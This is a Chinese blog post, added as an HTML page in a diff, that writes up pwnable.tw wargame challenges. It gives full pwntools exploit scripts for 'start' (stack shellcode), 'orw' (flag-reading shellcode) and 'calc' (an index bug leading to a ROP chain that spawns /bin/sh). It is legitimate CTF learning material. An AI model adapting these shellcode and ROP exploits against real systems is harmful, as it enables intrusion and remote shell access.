@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="pwnable.tw开始刷pwnable.tw的题，看界面挺酷的，感觉非常有难度，希望能坚持的久一点。 start保护全关，直接栈上写汇编就行，不过不能使用shellcraft.sh()，这个太大，自己写个汇编就行。 12345678910111213141516171819202122from pwn import *context(os&#x3D;&amp;#x27;linux&amp;#x27;, arch&#x3D;&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="study">
+<meta property="og:url" content="http://example.com/2022/02/04/pwnable.tw/index.html">
+<meta property="og:site_name" content="study">
+<meta property="og:description" content="pwnable.tw开始刷pwnable.tw的题，看界面挺酷的，感觉非常有难度，希望能坚持的久一点。 start保护全关，直接栈上写汇编就行，不过不能使用shellcraft.sh()，这个太大，自己写个汇编就行。 12345678910111213141516171819202122from pwn import *context(os&#x3D;&amp;#x27;linux&amp;#x27;, arch&#x3D;&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-03T16:44:12.435Z">
+<meta property="article:modified_time" content="2022-02-03T16:42:00.268Z">
+<meta property="article:author" content="rootzhang">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/02/04/pwnable.tw/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | study</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">study</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/pwnable.tw/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-04 00:44:12 / 修改时间：00:42:00" itemprop="dateCreated datePublished" datetime="2022-02-04T00:44:12+08:00">2022-02-04</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h1><p>开始刷pwnable.tw的题，看界面挺酷的，感觉非常有难度，希望能坚持的久一点。</p>
+<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>保护全关，直接栈上写汇编就行，不过不能使用shellcraft.sh()，这个太大，自己写个汇编就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./start&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08048097&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">5</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let\&#x27;s start the CTF:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">stact_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">4</span>+<span class="number">4</span>*<span class="number">5</span>+<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stact_addr)</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 11</span></span><br><span class="line"><span class="string">mov ebx, &#123;0&#125;</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(stact_addr-<span class="number">4</span>-<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">4</span>*<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>)+p32(stact_addr)+shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>写的可能有点麻烦，但大概流程就是泄露栈地址，然后直接asm,这个程序有意思的地方是只有两个函数start和exit,一般程序启动时的调用过程是这样的，_start<code>-&gt; </code>__libc_start_main<code>-&gt;</code>main，其中start和libc_start_mian是gcc汇编的时候加进去的。</p>
+<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>接收一个shellocde直接执行，没啥东西，不过这个是在段上执行，在本地竟然没办法执行也不知道为啥</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./orw&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x0804858A&#x27;)</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">mov ebx, 0x804a100</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov eax, 3</span></span><br><span class="line"><span class="string">mov ebx, 3</span></span><br><span class="line"><span class="string">mov ecx, 0x804a160</span></span><br><span class="line"><span class="string">mov edx, 0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov eax, 4</span></span><br><span class="line"><span class="string">mov ebx, 1</span></span><br><span class="line"><span class="string">mov ecx, 0x804a160</span></span><br><span class="line"><span class="string">mov edx, 0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&#x27;/home/orw/flag\x00&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>系统调用时i386和amd64接收参数的寄存器不一样，amd64接收前三位参数的寄存器分别是’rdi,rsi,rdx’,i386是’ebx,ecx,edx’，平时的i386函数调用参数是放在栈上的。</p>
+<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p>看源码看得我头皮发麻，看别人的wp也看的我头皮发麻，应该不是我现在水平能做的，以后再回来填坑吧。</p>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>代码比较复杂，看了快两个小时才看懂算法的整个策略，前半个多小时不知道calc是计算器的意思，看了老半天都没看懂这个程序是要干啥的，后面才知道calc是计算的意思，这个程序就是完成一个简单的计算器，策略是当前符号是+或者-则算上一次的符号，然后把当前符号压栈，如果是%,*,/就看上一次符号是不是+,-,如果是的话，把当前符号压栈，如果不是的话算上一次的符号，然后把当前符号压栈。策略是搞清楚了，但是漏洞还没找见🤦‍♀️🤦‍♀️🤦‍♀️🤦‍♀️</p>
+<p>发现了一个盲点，表达式的第一个值可以是符号，我稍微试了一下，当出现’-8-8’，就会发生段错误，😃😃😃有比较明确的思路了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+360+1</span><br><span class="line">-5105367</span><br><span class="line"></span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure>
+
+<p>历时五六个小时，终于做出来了，漏洞就是上面那个样子，不过得巧妙利用才行，最后修改calc函数的返回地址为构造的rop,最后成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./calc&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08049433&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x08049a21: int 0x80;</span></span><br><span class="line"><span class="string">0x0805c34b: pop eax; ret;</span></span><br><span class="line"><span class="string">0x08070880: int 0x80; ret; </span></span><br><span class="line"><span class="string">0x080481d1: pop ebx; ret;</span></span><br><span class="line"><span class="string">0x080701d1: pop ecx; pop ebx; ret; </span></span><br><span class="line"><span class="string">0x080701aa: pop edx; ret;</span></span><br><span class="line"><span class="string">0x080bc4f6: pop esp; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_eax=<span class="number">0x0805c34b</span></span><br><span class="line">pop_esp=<span class="number">0x080bc4f6</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x080701d1</span></span><br><span class="line">int80=<span class="number">0x08070880</span></span><br><span class="line">pop_edx=<span class="number">0x080701aa</span></span><br><span class="line">bss_addr=<span class="number">0x80eb000</span></span><br><span class="line">rop_read=[pop_eax,<span class="number">3</span>,pop_ecx_ebx,bss_addr,<span class="number">0</span>,pop_edx,<span class="number">0x50</span>,int80,pop_esp,bss_addr+<span class="number">0x10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_build</span>(<span class="params">rop</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;+360+1&#x27;</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop)):</span><br><span class="line">        m=<span class="number">361</span>+i</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;-1&#x27;</span>.<span class="built_in">format</span>(m)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;+&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m,rop[i])</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;-&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m+<span class="number">1</span>,rop[i]-<span class="number">1</span>)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload=<span class="string">&#x27;+360+1&#x27;</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line">    rop_build(rop_read)</span><br><span class="line">    sh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(pop_eax)+p32(<span class="number">11</span>)</span><br><span class="line">    payload+=p32(pop_ecx_ebx)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(pop_edx)+p32(<span class="number">0</span>)</span><br><span class="line">    payload+=p32(int80)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<p>脚本写的比较复杂，估计几天后我来看也看不懂了，不过至今还没看过别人的wp,都是自己搞出来的😊</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/02/02/house-of-husk/" rel="prev" title="house of husk">
+      <i class="fa fa-chevron-left"></i> house of husk
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable-tw"><span class="nav-number">1.</span> <span class="nav-text">pwnable.tw</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#start"><span class="nav-number">1.1.</span> <span class="nav-text">start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ORW"><span class="nav-number">1.2.</span> <span class="nav-text">ORW</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2018-1160"><span class="nav-number">1.3.</span> <span class="nav-text">CVE-2018-1160</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#calc"><span class="nav-number">1.4.</span> <span class="nav-text">calc</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">rootzhang</p>
+  <div class="site-description" itemprop="description">我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rootzhang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
